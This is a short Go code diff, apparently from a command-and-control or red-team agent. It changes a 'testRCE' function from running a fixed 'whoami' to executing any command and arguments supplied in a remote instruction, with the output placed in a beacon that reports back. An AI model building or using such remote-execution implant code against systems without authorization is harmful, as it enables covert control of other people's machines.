@@ -31,8 +31,8 @@ func main() {
 	}
 }
 
-func testRCE() (output string) {
-	cmd := GenerateCommand("whoami")
+func testRCE(instruction models.Instruction) (output string) {
+	cmd := GenerateCommand(instruction.Action.Cmd, instruction.Action.Args...)
 	out, err := Execute(cmd)
 	if err != nil {
 		log.Fatal(fmt.Errorf("Error executing command: %v", err))
@@ -51,7 +51,7 @@ func generateTestBeacon(instruction models.Instruction) (beacon models.Beacon) {
 	uuidHasher.Write([]byte("yeet"))
 	testAgent.UUID = uuidHasher.Sum(nil)
 
-	instruction.Action.Output = testRCE()
+	instruction.Action.Output = testRCE(instruction)
 
 	instruction.Agent = testAgent
 	
